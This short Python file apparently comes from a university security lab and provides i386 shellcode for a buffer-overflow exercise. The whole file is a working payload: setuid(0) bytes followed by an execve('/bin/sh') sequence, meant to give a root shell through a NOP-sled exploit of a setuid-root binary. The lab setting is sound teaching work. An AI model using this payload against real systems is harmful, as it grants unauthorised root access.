# CSE 29 Level 3 — provided Linux x86 (i386) shellcode
#
#   from shellcode import shellcode
#
# setuid(0)  then  execve("/bin/sh")
# Course VM: you log in as a normal user; this binary is setuid-root so a
# successful NOP-sled exploit yields a root shell.

setuid = b"1\xdb\x8dC\x17\x99\xcd\x80"

bin_sh = (
    b"\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08"
    b"\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)

shellcode = setuid + bin_sh
